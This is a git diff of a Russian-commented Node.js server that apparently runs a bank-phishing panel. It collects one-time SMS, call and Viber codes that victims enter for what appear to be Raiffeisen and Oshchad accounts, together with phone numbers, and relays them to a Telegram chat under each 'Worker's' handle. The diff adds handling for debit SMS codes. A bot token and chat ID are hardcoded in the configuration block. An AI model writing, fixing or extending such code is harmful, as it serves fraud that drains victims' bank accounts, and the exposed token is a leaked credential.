@@ -1,4 +1,4 @@
-Const express = require('express');
+const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
@@ -6,7 +6,6 @@ const path = require('path');
 const { atob } = require('buffer');
 
 // --- КОНФИГУРАЦИЯ ---
-// Я ВЕРНУЛ ВАШИ ПРАВИЛЬНЫЕ ДАННЫЕ ЗДЕСЬ
 const TELEGRAM_BOT_TOKEN = '8383351361:AAF8fhC3zwfegB2lF6hlwqw2U5UozpGxn_k';
 const CHAT_ID = '-4961970994';
 // --- КОНЕЦ КОНФИГУРАЦИИ ---
@@ -32,7 +31,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, '✅ Бот перезапущен и готов к работе!', { parse_mode: 'HTML' }).catch(console.error);
+    bot.sendMessage(CHAT_ID, ' Перезапустил сервак.', { parse_mode: 'HTML' }).catch(console.error);
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -134,8 +133,7 @@ bot.on('callback_query', (callbackQuery) => {
              break;
 
         case 'viber_call':
-            // Отправляем команду 'viber', которую фронтенд понимает и которая открывает окно с 6-значным кодом.
-            command.type = 'viber';
+            command.type = 'viber_call';
             responseText = 'Запрос Viber 📞 отправлен!';
             break;
 
@@ -184,6 +182,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         } 
+        // --- ДОБАВЛЕН ЭТОТ БЛОК ---
         else if (stepData.debit_sms_code) {
             message = `<b>💸 Код списания (Райф)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
@@ -194,15 +193,7 @@ app.post('/api/submit', (req, res) => {
         }
     } 
     else {
-        if (stepData.viber_code) {
-            message = `<b>📞 Код из Viber (Ощад)</b>\n\n`;
-            message += `<b>Код:</b> <code>${stepData.viber_code}</code>\n`;
-            const phone = newData.phone || newData.fp_phone || 'не указан';
-            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
-            message += `<b>Worker:</b> @${workerNick}\n`;
-            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.call_code) {
+        if (stepData.call_code) {
             message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
